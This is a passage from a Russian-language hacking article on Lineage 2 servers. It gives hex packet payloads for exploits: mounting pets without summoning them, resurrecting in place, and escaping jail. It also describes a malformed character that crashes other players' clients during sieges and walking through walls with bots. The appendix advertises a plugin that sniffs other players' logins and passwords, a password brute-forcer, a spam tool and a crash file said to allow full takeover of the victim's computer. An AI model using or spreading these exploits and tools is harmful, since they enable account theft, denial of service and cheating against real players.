+Как видите, тут прослеживаются те "типы рандома" о которых писал f4llen при том, что выпадение 0 и 1 равновероятно и
+никакой закономерности тут нет. Плюс ко всему при промежуточных измерениях вероятностей (для каждых 60-ти чисел),
+вероятность успеха несколько отклонялась от 50%, но общая всё равно была максимально близка к действительной
+вероятности выпадения 0 или 1.
+Таким образом, статистика f4llen'а ни что иное, как попытка систематизировать обычный рандом.
+
+Ну и последний камень в сторону тех, кто считает, что на вероятность заточки влияет даже погода за окном:
+В L2j нет своего генератора случайных чисел, в нём такой же библиотечный рандомайзер, что был использован выше. С той
+лишь разницей, что на вероятность заточки влияет одно единственное число, которое выставляется администрацией.
+Будте уверены, в lineage2 off то же самое.
+
+В итоге, хочу сказать, что не стоит пытаться обмануть rand(), скорее он обманет вас =) Стоит искать баги в самом
+процессе точки, но опять же, как было продемонстрировано выше, это слишком простой процесс, чтобы быть бажным.
+
+
+А вообще, "случайностей не бывает, а бывают только неизвестные нам закономерности" (c) Кто-то.
+
+
+
+12. Геодата (хождение сквозь стены).
+Сегодня постучался человек в асю и начал спорить, что l2j ничем не отличается от оффа. В связи с этим я решил
+добавить в статью пару слов про геодату в l2j и off.
+Процесс передвижения по миру в la2 реализован довольно интересно. Оказывается, за тем, куда идти следит и сервер и
+клиент параллельно. Точнее, вы кликаете в ту точку, куда хотите попасть, клиент в соответствии с имеющейся у него
+геодатой смотрит можно ли туда пройти, если да, то посылает запрос на сервер. Тот уже в соответствии со своей
+геодатой разрешает или возвращает вас в исходное положение. Этим как раз и объясняется феномен под названием
+"нивидимые стены", который, кстати, присущь нашим фришардным проджектам с кривыми локациями.
+В l2j же нет геодаты, она прикручевается к нему дополнительно. Что это значит? А то, что за передвижением чара
+следит только клиент по имеющейся у него геодате. Поэтому, воспользовавшись ботом (в котором понятное дело также
+нет геодаты), вы можете ходить сквозь стены, потому что ни сервер, ни клиент (в лице бота) просто не знают про них.
+Эта проблема кстати не только l2j. На С1ОФФ как правило С3/C4 локации также без геодаты, то есть там точно также
+ответственность за передвижение возлагается только на клиента.
+
+Если разбирать передвижение более подробно, то оно реализуется пакетом "0x01 MoveBackwardToLocation". В нём
+присутствует два набора координат - где стоим и куда хотим попасть. После этого пакета сервер начинает нас
+шаг за шагом двигать в желаемую нами точку. Причём, с каждым шагом он не посылает нам новые координаты! Для
+того, чтобы клиенту узнать в какой точке в данный момент он находится, посылается пакет "0x48 ValidatePosition".
+То есть, в целом, мы посылаем пакет с координатами куда хотим попасть, а потом просто периодически проверяем,
+грубо говоря, на сколько мы продвинулись.
+Но это так, для общего развития, так сказать =)
+
+
+
+13. Прикол с SocialAction (0x1b)
+Что такое SocialAction, думаю, объяснять не надо. Оказалось, что помимо смеха, приветствия, победы и тд, анимация
+при LVL UP'е является таким же SocialAction'ом. А, насколько вам известно, запрос на произведение SocialAction
+отправляет клиент, то есть мы сами можем в любой момент сделать себе lvlup =) Только анимацию, разумеется.
+Вот формат SocialAction-пакета:
+
+1b // Тип пакета (SocialAction)
+0f 00 00 00 // номер action'а (0f - lvlup)
+
+
+
+14. Баг c Ride (0x6a)
+Запрос "Ride" посылает клиент, когда хочет забраться на страйдера или виверена.
+Формат:
+
+6a // тип пакета
+00 00 00 00 // 0/1 слезть/залезть
+00 00 00 00 // номер питомца: 1 - страйдер, 2 вивирен
+
+Когда у вас вызван страйдер и вы посылаете запрос "Ride", на самом деле, страйдер исчезает (то есть выходит из игры
+и теряет свой OID - этим как раз объясняется то, что когда вы с него слезаете, он пропадает), а садитесь вы уже не
+конкретно на своего страйдера, а на некий эталон страйдеров :) Немного некорректно выразился, ну да ладно.
+Оказалось, что на некоторых ла2-серверах отсутствует проверка на то, а вызывали ли вы вообще страйдера, перед тем
+как на него сесть. То есть ни с того, ни с сего, послав пакет:
+6a 01 00 00 00 01 00 00 00
+Вы сядете на страйдера, хоть и не вызывали его. Причём, даже если у вас нет дудки. Таким же образом можно садится и
+на виверен.
+Этот баг, также как и прикол с SocialAction был найден человеком под ником Maddaemon. Гратз ему.
+
+
+
+15. Выкидываем из игры чаров
+Этот баг я открыл случайно, изучая всё тех же мутантов. Меня мучал вопрос, почему когда при создании чара указываешь
+несуществующую рассу (число больше 4-ёх), всегда создаётся чар с текстурами human'а? Причём, этот human не может учить
+скиллы у NPC human'ов, то есть ничего кроме текстур его с людьми не объединяло. Так вот, оказалось, что в виде human'а
+таких чаров воспринимает _только_ С1/C3 клиенты. С4 же для таких чаров текстуры просто не находит и вылетает с ошибкой.
+То есть, как только в зону видимости la2 C4 клиента попадает такой чар, он падает. Под зоной видимости я подразумеваю
+не то, что вы видите на экране, а приблизительно зону видимости команды "/target".
+Так, например, поставив такого персонажа рядом с замком на время осады, у нападающих не будет шанса, т.к. ботами
+захватывать замок крайне проблематично, а клиентом зайти в игру они просто не смогут.
+
+Я испытал это на трёх крупных отечественных С4 серверах (не l2j), везде работало.
+Такими чарами, кстати, можно проверять персонажей на ботов ) Если не упал, значит бот. Но это способ для ГМов-садистов
+имхо.
+
+http://m00.void.ru/nuke.rar - видео запись с одного из Российских С4 серверов. На ней показано, какой эффект оказывают
+такие чары на других игроков.
+
+
+
+16. Баг с RequestRestartPoint (оживление и побег из тюрьмы)
+Этот баг был найден нашим соотечественником из подполья www.allcheats.ru под ником sshd.
+Когда вы умираете, у вас появляется окно с выбором места, где как бы вас оживить. При обычных условиях там всего одна
+кнопка: "return to the nearest village". После нажатия на которую игра посылает пакет:
+
+6d // тип пакета (RequestRestartPoint)
+00 00 00 00 // аргумент, который собственно говорит серверу о том, куда нас вернуть
+
+Баг заключается в том, что как раз клиент говорит серверу куда вернуть чара после смерти. То есть, не клиент, а мы.
+LA2 С3/C4 серверы поддерживают следующие значения аргумента (места возврата):
+
+0 – return to town (в город)
+1 – hide PK (если вы ПК, возвращает в город ПК или в окрестности того города, где вас убили)
+2 – to castle (в замок)
+3 – to siege HQ (к флагу во время осады)
+4 – fixed, festival (во время фестиваля тьмы оживляет вас на месте).
+
+Таким образом, послав вместе "00 00 00 00", "04 00 00 00" наш чар оживится на том месте, где собственно был убит.
+В связи с этим багом, у меня возникла мысль о том, как можно вызволить из тюрьмы персонажа.
+Для этого чар, находящийся в тюрьме, должен быть в клане. Этот клан записывается на осаду и ставит флаг, при этом
+чара, который в тюрьме надо каким-нибудь образом убить. На antaras.ru, к примеру, это не сложно, там вокруг тюрьмы
+аггры, бьющие через стену. Далее вы просто посылаете "RequestRestartPoint" пакет с аргументом "03 00 00 00" и чар
+появляется (должен появится :)) живой у флага.
+
+
+
+17. Раздеть чужого персонажа не зная ни логина, ни пароля - разве это реально?
+Да, к сожалению это реально. Я решил убрать этот параграф из статьи, так как это очень серьёзная брешь в lineage2,
+которая наделает ещё не мало шуму. Не хочу, чтобы это было на моей совести :)
+Скажу лишь, что существует возможность входить под рандомными персонажами (то есть сами мы конкретного персонажа
+выбрать не можем, это делает сервер). Пока что это было опробовано только на известном сервере www.l2extreme.com,
+но я уверен, что это работает и на других.
+Так что не удивляйтесь, если вашего чара с паролем аля "6IlZk9qR[!]" вдруг разденут.
+
+
+
+18. Итог
+Чтож, я описал достаточное кол-во багов. К сожалению, к моменту публикации статьи большинство из них стали уже не
+так актуальны. То, что актульно сейчас или находится в данный момент в разработке, возможно будет выложено позднее
+на форуме la2brute.5bb.ru.
+
+
+V. Баги нового поколения
+[вырезано]
+Могу лишь сказать, что их будет использовать мой новый ингейм бот LA2Monster.
+
+
+VI. Пара слов о C4
+Вообще С4 всё ещё никак не может устаканиться. Точнее пошло некое разветвление в реализации авторизации.
+L2J C4 серверы стали применять для шифрования авторизационного пакета RSA (впрочем как и ОФФ от NCSoft).
+Причём, пара private/public-ключей генерируется для каждого соединения. Клиенту в первом пакете сервер
+передаёт 1024-битный публичный ключ, которым клиент _поверх_ blowfish шифрует пакет с логином/паролем.
+Этот способ гарантирует то, что никто извне не сможет получить клиентский логин и пароль. Хотя, если
+вспомнить взлом Rc5-64, то раскрытие 128-байтного ключа не кажется таким уж заоблочным.
+Хочется отметить, что генерация key-pair в RSA достаточно трудоёмкое занятие. У меня на генерацию пары ключей
+с помощью библиотек openssl уходило ~1.5-2 секунды, что для сервера с онлайном, скажем, в 1000 человек -
+непозволительная роскошь. Хотя опять же, login-сервер по задумкам NCSoft должен быть на другой машине нежели 
+game-сервер, но, как я уже писал выше, это не всегда выполняется у нас в России.
+Что же касается С1ОФФ переделанных в С4, RSA в них не используется. Хотя изменена работа с внутренними
+идентификаторами, которые используются для авторизации на game-сервере. При этом и для l2j и для с1офф-с4
+используется один и тот же С4 клиент.
+
+
+
+VII. Послесловие.
+Конечно, по этой статье нельзя создать RFC по lineage, ибо, естественно, некоторые моменты
+я пропускал, так как они были не важны или я до конца не понимал их сам. Так или иначе, я считаю, что
+дал вам уйму пищи для размышлений.
+Если вы с чем-то не согласны или знаете (думаете, что знаете :D) чего я не знаю, пишите на d4rk@securitylab.ru,
+либо в ЛС на www.allcheats.ru на ник "nop".
+Буду рад пообщаться.
+
+
+VIII. Ссылки.
+
+http://72.14.203.104/search?q=cache:Dt3J-o9GNJcJ:gamehaqs.com/forums/
+index.php%3Fshowtopic%3D5041+blowfish+lineage2&hl=ru&gl=ru&ct=clnk&cd=1 -
+сохранённая в кэшэ гугла bbs'ка, на которой обсуждалось клиент-серверное взаимодействие lineage.
+Судя по постам, народ упорно не хочет смотреть исходники l2j и пытается методом тыка найти способ
+авторизоваться на сервере.
+http://forum.ragezone.com/server-help-extra/lin1-server-emulator-incomplete-cant-even-login-26438.html - То же самое
+http://allcheats.ru/forums/showthread.php?t=1844 - то же самое, только наши Русские. В отличие от
+америкосов, далеко продвинулись.
+http://cheaters.net.ua/forum/index.php?s=083fef4f61997fc4be2ad3b0a98ba8a2&showtopic=254&pid=2254&st=0&#entry2254 -
+статья F4llen'а про fake-энчант и про типы рандома (она упоминалась в этой статье в параграфе про заточки).
+http://www.javable.com/columns/crypto/algorythms/01/ - отличный раздел про blowfish.
+http://arbuz.uz/z_pihns.html - интересная статья про расчёт числа Пи исходя из теории вероятности. Так, для расширения
+кругозора.
+http://www.securitylab.ru/analytics/216301.php - моя предыдущая статья подобной тематики. Она
+более простая за счёт интуитивно-понятного протокола HalfLife, рекомендую новичкам начать с неё.
+http://la2brute.5bb.ru - коммерческий проект.
+http://m00.void.ru/nuke.rar - видео запись - приложение к параграфу 13 (Выкидываем из игры чаров)
+http://la2brute.5bb.ru/viewtopic.php?id=52 - показано, как с помощью LA2Fun учить скиллы любого уровня на проджектах
+и смешивать проффессии на l2j.
+http://la2brute.5bb.ru/viewtopic.php?id=53 - показано, как создавать мутантов (на примере бессмертных) на проджектах
+с помощью LA2Fun.
+
+
+IX. Приложения к статье.
+Приложение к статье находится по адресу: m00.blackhat.ru/la2shit.rar
+Содержимое:
+game-serv-encryption.txt - исходник на асме шифрования пакетов game-сервером (выкладывал sauron на allcheats.ru).
+grabber.c - старый пример скачивания ников с сайта на примере www.antaras.ru. Кстати, на antaras.ru уже давно
+ввели cookie, так что этот пример уже на нём не работает. Этот код упоминался в разделе про перебор паролей.
+ID.rar - список предметов и соответствующих им ID
+la2brute_1.1.OLD.rar - старая тестовая версия la2brute. Была написана в феврале-марте этого года. Виснет, падает, так
+что считайте это PoC'ом =)
+la2reklamer.rar - программа для массовой рассылки сообщений. Сама скачивает ники игроков, которые онлайн и в течение
+минуты каждому из них персонально пишет приватное сообщение.
+raid.jpg - пример того, как можно использовать бессмертных мутантов =) автор Hint
+screenshot1.jpg - скрин генератора auth-пакетов
+screenshot2.jpg - скрин совместной работы моего патча для sniffit и переборщика паролей к ла2 серверам.
+shot1.JPG, shot2.JPG, shot3.JPG - скрины мутантов, созданных с помощью la2fun
+sniff.exe - эх от сердца отрываю.. сниффер, который перехватывать и расшифровывает входящий/исходящий la2-траффик.
+Причём и login-сервера и game-сервера. Настроен на мой сетевой интерфейс, так что для использования вам придётся
+покопаться в бинарном коде =)
+mass.nuke.avi - запись того, как из-за моего чара с сервера падают сотни человек.
+la2-example.c - пример конструирования RequestAuthLogin-пакета
+Sniffit.LA2C3.plug.rar - плагин для sniffit, который позволяет перехватывать чужие RequestAuthLogin-пакеты и
+вытаскивать из них логин/пароль
+l2.crash.ini - Зашифрованный файл с настройками для L2C3 клиента от которого он падает. При удачной эксплуатации
+может позволить получить полный доступ к компьютеру, на котором этот l2.ini был использован.
+la2fun_1.2.demo.rar - урезанный LA2Fun 1.2. Может создавать мутантов, бессмертных чаров, чаров без головы, учить скиллы любых уровней.
+Последние версии LA2Fun и LA2Bute 1.5 (С3/C4) я решил не выкладывать из уважения к тем, кто их покупал за деньги..
+Также хотел выложить linux-версию la2brute, но что-то не смог найти :\
+
+
+Особое спасибо h0snp, sshd и hint =) 
+А также приветы Silence/EF ;) и каналу #m00 на irc.blackhat.ru
+
+
+(c) darkgrey / m00.blackhat.ru
+
+
